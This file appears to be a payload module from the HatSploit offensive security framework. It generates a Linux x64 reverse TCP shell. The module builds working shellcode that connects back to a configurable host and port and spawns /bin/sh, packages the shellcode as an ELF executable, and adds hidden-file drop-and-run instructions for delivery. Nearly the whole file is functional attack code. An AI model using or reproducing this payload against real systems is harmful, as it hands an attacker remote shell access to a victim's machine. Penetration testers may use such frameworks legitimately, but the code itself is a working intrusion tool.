#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.payload import Payload
from utils.payload.payload import PayloadGenerator
from utils.tcp.tcp import TCPClient


class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
    details = {
        'Category': "stager",
        'Name': "Linux x64 Shell Reverse TCP",
        'Payload': "linux/x64/shell_reverse_tcp",
        'Authors': [
            'enty8080'
        ],
        'Description': "Shell reverse TCP payload for Linux x64.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Platform': "linux",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'FORMAT': {
            'Description': "Executable format.",
            'Value': "elf",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        local_host, local_port, executable_format = self.parse_options(self.options)

        local_host = self.host_to_bytes(local_host)
        local_port = self.port_to_bytes(local_port)

        if executable_format not in self.formats.keys():
            self.output_error("Invalid executable format!")
            return

        self.output_process("Generating shellcode...")
        shellcode = (
                b"\x6a\x29" +  # pushq  $0x29
                b"\x58" +  # pop    %rax
                b"\x99" +  # cltd
                b"\x6a\x02" +  # pushq  $0x2
                b"\x5f" +  # pop    %rdi
                b"\x6a\x01" +  # pushq  $0x1
                b"\x5e" +  # pop    %rsi
                b"\x0f\x05" +  # syscall
                b"\x48\x97" +  # xchg   %rax,%rdi
                b"\x48\xb9\x02\x00" +  # movabs $0x100007fb3150002,%rcx
                local_port +  # port
                local_host +  # ip
                b"\x51" +  # push   %rcx
                b"\x48\x89\xe6" +  # mov    %rsp,%rsi
                b"\x6a\x10" +  # pushq  $0x10
                b"\x5a" +  # pop    %rdx
                b"\x6a\x2a" +  # pushq  $0x2a
                b"\x58" +  # pop    %rax
                b"\x0f\x05" +  # syscall
                b"\x6a\x03" +  # pushq  $0x3
                b"\x5e" +  # pop    %rsi
                b"\x48\xff\xce" +  # dec    %rsi
                b"\x6a\x21" +  # pushq  $0x21
                b"\x58" +  # pop    %rax
                b"\x0f\x05" +  # syscall
                b"\x75\xf6" +  # jne    27 <dup2_loop>
                b"\x6a\x3b" +  # pushq  $0x3b
                b"\x58" +  # pop    %rax
                b"\x99" +  # cltd
                b"\x48\xbb\x2f\x62\x69\x6e\x2f" +  # movabs $0x68732f6e69622f,%rbx
                b"\x73\x68\x00" +  #
                b"\x53" +  # push   %rbx
                b"\x48\x89\xe7" +  # mov    %rsp,%rdi
                b"\x52" +  # push   %rdx
                b"\x57" +  # push   %rdi
                b"\x48\x89\xe6" +  # mov    %rsp,%rsi
                b"\x0f\x05"  # syscall
        )

        self.output_process("Generating payload...")
        payload = self.generate(executable_format, 'x64', shellcode)

        instructions = ""
        instructions += "cat >/tmp/.payload;"
        instructions += "chmod 777 /tmp/.payload;"
        instructions += "sh -c '/tmp/.payload' 2>/dev/null &"
        instructions += "\n"

        self.payload = payload
        self.instructions = instructions
